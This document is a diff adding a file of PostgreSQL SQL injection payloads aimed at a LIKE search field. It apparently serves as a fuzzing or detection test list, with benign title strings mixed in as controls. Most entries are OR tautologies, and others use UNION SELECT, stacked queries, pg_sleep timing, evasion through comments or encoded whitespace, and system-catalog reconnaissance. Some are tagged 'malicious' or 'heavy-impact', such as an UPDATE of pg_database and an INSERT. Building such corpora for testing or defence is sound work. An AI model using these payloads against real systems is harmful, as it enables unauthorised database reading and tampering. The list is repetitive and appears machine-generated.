@@ -1,0 +1,231 @@
+asd%' OR 1=1 OFFSET 0--
+The Union
+asd%' OR 4 BETWEEN 3 AND 5--
+asd%' OR CURRENT_TIME IS NOT NULL--
+Gatsby AND Daisy
+asd%' OR NOT(FALSE)--
+asd%' OR '{"a":1}'::json ->> 'a' = '1'--
+asd%'/**/OR/**/1=1--
+asd%' OR PG_CONF_LOAD_TIME() IS NOT NULL--
+Between Two Ferns
+asd%' OR (SELECT true)--
+asd%' OR ceIL(1.1)=2--
+Set It Off
+asd%' OR RANDOM() < 1--
+asd%' OR LENGTH(version())>0--
+asd%' OR ABS(-1)=1--
+asd%' OR USER = USER--
+asd%' OR SIN(0)=0--
+asd%' OR XMLROOT(XMLPARSE(DOCUMENT '<x>1</x>'), VERSION '1.0') IS NOT NULL--
+asd%' OR CURRENT_USER = CURRENT_USER--
+asd%' OR 'abc' LIKE '%c'--
+asd%' OR 'x' IN ('x','y')--
+asd%'%09OR%091=1--
+asd%' OR quote_ident('test') = 'test'--
+asd%' OR BIT_LENGTH('a') = 8--
+asd%' OR CONCAT('a','b')='ab'--
+asd%' OR NOT NOT TRUE--
+asd%' OR POWER(2, 2) = 4--
+asd%' OR('1'::integer = 1)--
+asd%' OR CURRENT_DATE = CURRENT_DATE--
+asd%' OR CHAR_LENGTH('abc')=3-- (dedupe-allowed form kept)
+asd%' OR LEAST(5,5)=5--
+asd%' OR format('%s','a')='a'--
+asd%' OR (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE '%'-- (generated)
+asd%' OR 't'::boolean--
+asd%' OR 'yes'::boolean IS TRUE--
+asd%' UNION SELECT NULL--
+asd%' OR 'abc' ILIKE 'A%'--
+Drop Dead Gorgeous
+asd%' OR ARRAY_LENGTH(ARRAY[1,2],1)=2--
+asd%' OR DECODE('YQ==','base64')='a'--
+asd%' OR PI() > 3--
+asd%' OR EXISTS(SELECT 1)--
+asd%' OR 123=123::integer--
+asd%' OR '{ "a":1 }'::jsonb ? 'a'--
+asd%' OR 'abc' SIMILAR TO '(a|b)%'--
+asd%' OR LOWER('A')='a'--
+asd%' OR sqrt(4)=2--
+From Here to Eternity
+asd%' OR 'abc' LIKE 'a%'--
+asd%' OR 'on'::boolean IS TRUE--
+asd%'%0AOR%0A1=1--
+asd%' OR U&'d\0061t\0061'='data'--
+asd%' OR CEIL(1.1) = 2--
+Insert Coin
+asd%' OR pg_sleep(0) IS NOT NULL--
+asd%' OR translate('abc','a','1')='1bc'--
+asd%' OR session_user=session_user--
+asd%'/**/OR/**/'a'='a'--
+asd%' OR ARRAY[1,2,3] @> ARRAY[1]--
+asd%' OR 5%2=1--
+asd%' OR REPEAT('a',2)='aa'--
+asd%' UNION ALL SELECT 1--
+asd%' OR NOT (1=0)--
+asd%' OR 1=ANY(ARRAY[1,2])--
+asd%' OR bigint '1'=1-- (new unique)
+asd%' OR 1=1 FETCH FIRST 1 ROWS ONLY--
+asd%' OR CURRENT_SCHEMA() LIKE '%--
+asd%' OR txid_current() > 0--
+asd%' OR (SELECT relname FROM pg_class LIMIT 1) IS NOT NULL--
+asd%' OR MAKE_INTERVAL(years=>1) IS NOT NULL-- (new)
+Like a Boss
+asd%' OR (1/1)=1--
+asd%' OR 'abc'!~'d'--
+asd%' OR ASCII('a')=97--
+asd%' OR 'a'!='b'--
+asd%' OR 1 IN (1,2,3)--
+asd%' OR JSONB_TYPEOF('{"a":1}'::jsonb)='object'-- (new)
+asd%' OR PG_BACKEND_PID() > 0--
+asd%' OR MAKE_INTERVAL(months=>1) IS NOT NULL-- (new)
+asd%' OR LEAST(1,2)=1--
+asd%' OR floor(1.9)=1--
+asd%' OR (1+1)>(1)--
+Revoke License
+asd%' OR SUBSTRING('abc',1,1)='a'--
+asd%' OR 1=1--
+asd%' OR 2*1=2--
+asd%' OR POWER(2,2)=4--
+asd%' OR EXISTS(SELECT 1)--
+asd%' OR SUBSTR('abc',1,1)='a'--
+asd%' OR 5::text LIKE '5'--
+asd%' OR inet_server_addr() IS NOT NULL--
+Orwell OR Huxley
+asd%' OR 1+1=2--
+asd%' OR 'a'='a'--
+asd%' UNION ALL SELECT NULL--
+asd%' OR quote_ident('test')='test'--
+asd%' OR NULL IS NULL--
+asd%' OR 1<>2--
+asd%' OR 2-1=1--
+asd%' OR LENGTH('abc')=3--
+asd%' OR exp(0)=1--
+Where is the Bathroom
+asd%' OR ABS(-1)=1--
+asd%' OR random()<1--
+asd%' OR RIGHT('abc',1)='c'--
+asd%' OR ARRAY_LENGTH(ARRAY[1,2],1)=2--
+asd%' OR JSONB_EXISTS('{"a":1}'::jsonb,'a')-- (new)
+asd%' OR LOG(10)=1--
+asd%' OR REVERSE('abc')='cba'--
+asd%' OR 1 IN (1,2,3)--
+asd%' OR ASCII('z')>1--
+asd%' OR (1*1)<(2)--
+asd%' OR current_setting('server_version') IS NOT NULL--
+asd%' OR VERSION() LIKE '%--
+Delete This
+asd%' OR sin(0)=0--
+asd%'; SELECT 1--
+asd%' OR random()<1--
+asd%' OR 1=1 FOR UPDATE--
+asd%' OR JSON_TYPEOF('{"a":1}'::json)='object'-- (new)
+asd%' OR NOT FALSE--
+asd%' OR width_bucket(5,0,10,2)=2--
+asd%' OR has_database_privilege(current_user,current_database(),'CONNECT')--
+asd%' OR CURRENT_DATE=CURRENT_DATE--
+asd%' OR TO_HEX(15)='f'--
+asd%' OR pg_postmaster_start_time() IS NOT NULL--
+asd%' OR ARRAY[1,2,3]@>ARRAY[1]--
+asd%' OR format('%s','a')='a'--
+Table for Two
+asd%' OR char_length('abc')=3--
+asd%' OR(SELECT 1)=1--
+asd%' OR '{"a":1}'::jsonb ? 'a'--
+asd%' OR ABS(-1)=1--
+asd%' OR 'abc' SIMILAR TO 'abc'--
+asd%' OR current_database() LIKE '%--
+asd%'/'/**/OR/**/772=772--
+asd%' OR pg_backend_pid()>0--
+asd%' OR 2*1=2--
+asd%' OR UPDATE pg_database SET datistemplate=true-- (new malicious)
+asd%' OR MAKE_INTERVAL(days=>1) IS NOT NULL-- (new)
+Group Therapy
+asd%' OR 'x'||'y' LIKE 'xy'--
+asd%'; SELECT pg_sleep(1)--
+asd%' OR NULLIF(1,2)=1--
+asd%' OR floor(1.5)=1--
+asd%' OR JSONB_BUILD_OBJECT('x',1)->>'x'='1'-- (new)
+asd%' OR 4/2=2--
+asd%' OR CURRENT_TIME IS NOT NULL--
+asd%' OR ARRAY_LENGTH(ARRAY[1,2],1)=2--
+asd%' OR 99.9>10.1--
+asd%' OR pg_sleep(0) IS NOT NULL--
+asd%' OR 1=1 LIMIT 1--
+Into the Wild
+asd%' OR REPEAT('a',2)='aa'--
+asd%' OR session_user=session_user--
+asd%' OR LENGTH('abc')=3--
+asd%' OR WHERE TRUE LIMIT 1-- (new)
+asd%' OR RANDOM()<1--
+Ascending Heights
+asd%' OR NULLIF(current_user,'valid_user') IS NULL--
+asd%' OR format('%s','a')='a'--
+asd%' OR EXISTS(SELECT 1)--
+Order of the Phoenix
+asd%' OR UPPER('a')='A'--
+asd%' OR 1=1/*
+asd%' OR 5%2=1--
+asd%' OR exp(0)=1--
+asd%' OR inet_client_addr() IS NULL--
+Limitless
+asd%' OR quote_ident('test')='test'--
+asd%' OR CURRENT_DATE=CURRENT_DATE--
+asd%'/**/OR/**/'a'='a'--
+asd%' OR SUBSTRING('abc',1,1)='a'--
+asd%'%0AOR%0A1=1--
+asd%' OR BIT_LENGTH('a')=8--
+asd%' OR NULL IS NULL--
+asd%' OR format('%s','a')='a'--
+asd%' OR CURRENT_SCHEMA() LIKE '%--
+asd%' OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1--
+asd%' OR CEIL(1.1)=2--
+asd%' OR TO_HEX(15)='f'--
+asd%' OR RANDOM()<1--
+asd%' OR TRUE IS TRUE--
+asd%' OR FALSE IS FALSE--
+asd%' OR (SELECT count(*) FROM pg_class)>0--
+asd%' OR version() LIKE '%--
+asd%' OR LENGTH(version())>0--
+asd%' OR '0'::boolean IS FALSE--
+asd%' OR EXISTS(SELECT 1)
+asd%' OR ABS(-1)=1--
+asd%' OR GREATEST(1,0)=1--
+asd%' OR RANDOM()<1--
+asd%' OR 1<>2--
+asd%' OR ARRAY[1,2,3]@>ARRAY[1]--
+asd%' OR pg_postmaster_start_time() IS NOT NULL--
+asd%' OR POWER(2,2)=4--
+asd%' OR CONCAT('a','b')='ab'--
+asd%' OR CEIL(1.1)=2--
+asd%' OR POWER(2,2)=4--
+asd%'/**/OR/**/772=772--
+asd%' OR 1=1--
+asd%' OR 1=1--
+asd%' OR exp(0)=1--
+asd%' UNION SELECT 'a','b','c'--
+asd%' OR TRUE IS TRUE--
+Grant and Lee
+asd%' OR 1=1--
+asd%' OR ABS(-1)=1--
+asd%' OR BIT_LENGTH('a')=8--
+asd%' OR NOT NOT TRUE--
+asd%' OR current_user=current_user--
+asd%' OR CURRENT_TIME IS NOT NULL--
+asd%' OR session_user=session_user--
+asd%'""/**/OR/**/1=1--
+asd%' OR INSERT INTO test VALUES('x')-- (new heavy-impact)
+asd%' OR TO_HEX(15)='f'--
+asd%'%09OR%091=1--
+asd%'/**/OR/**/'a'='a'--
+Values of Society
+asd%' OR JSON_TYPEOF('{"a":1}'::json)='object'--
+asd%' OR REVERSE('abc')='cba'--
+asd%' OR 'on'::boolean IS TRUE--
+asd%' OR CURRENT_SCHEMA() LIKE '%--
+asd%' OR\*/1=1--
+asd%' OR(SELECT 1)=1--
+asd%' OR exp(0)=1--
+Create Space
+asd%' OR 5%2=1--
+asd%' OR sin(0)=0--
+asd%' OR floor(1.5)--
